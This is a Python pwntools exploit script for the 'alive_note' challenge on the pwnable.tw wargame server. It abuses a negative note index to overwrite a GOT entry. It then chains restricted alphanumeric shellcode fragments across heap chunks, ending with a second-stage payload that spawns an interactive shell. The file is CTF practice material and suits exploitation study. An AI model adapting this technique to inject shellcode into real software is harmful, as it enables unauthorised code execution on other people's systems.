#coding=utf-8
from pwn import *
local = 0
exec_file="./alive_note"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
#argv=["/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so",
#          "--library-path","/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/","./alive_note"]
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10300)
    #libc=ELF("./libc.so.6")
def get_base(a):
    print a.libs()
    #text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    text_base = a.libs()[a._cwd + "/alive_note"]
    for key in a.libs():
        if "libc-2.31.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x080488EA
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def add(idx,name):
    menu(1)
    a.sendlineafter("Index :",str(idx))
    a.sendlineafter("Name :",name)
    return 

def delete(idx):
    menu(3)
    a.sendlineafter("Index :",str(idx))
    return 
    
def edit(idx,content):
    return 
    
def show(idx):
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33 IO_FILE

def chunk_padding(time):
    for i in range(time):
        add(0x3,"aaaaaaaa")

#debug()
''' 0x31 - 0x39, 41 - 5a, 61 - 7a''' 


real_shellcode = '''
    push eax
    pop ecx
    push 0x7a
    pop edx
'''
print disasm("\x75\x00")
#context.log_level = "debug"
add(-27,asm(real_shellcode) + "\x75\x39")
chunk_padding(3)

real_shellcode_2 = '''
    push ebx
    pop eax
    dec eax
    xor byte ptr[ecx + 0x41], al 
'''
add(2,asm(real_shellcode_2) + "\x75\x38")
chunk_padding(3)

real_shellcode_3 = '''
    xor al, 0x4e
    xor byte ptr[ecx + 0x42], al
    push ebx
'''
add(2,asm(real_shellcode_3) + "\x75\x38")
chunk_padding(3)

real_shellcode_4 ='''
    push 0x33
    pop eax
    xor al, 0x30
    push eax
'''
add(1,asm(real_shellcode_4) + "\x75\x39")
chunk_padding(3)

biu = "\x30\x32\x31"
add(2,biu)
delete(1)

payload = 'a' * 0x43 + asm(shellcraft.sh())
a.sendline(payload)
a.interactive()
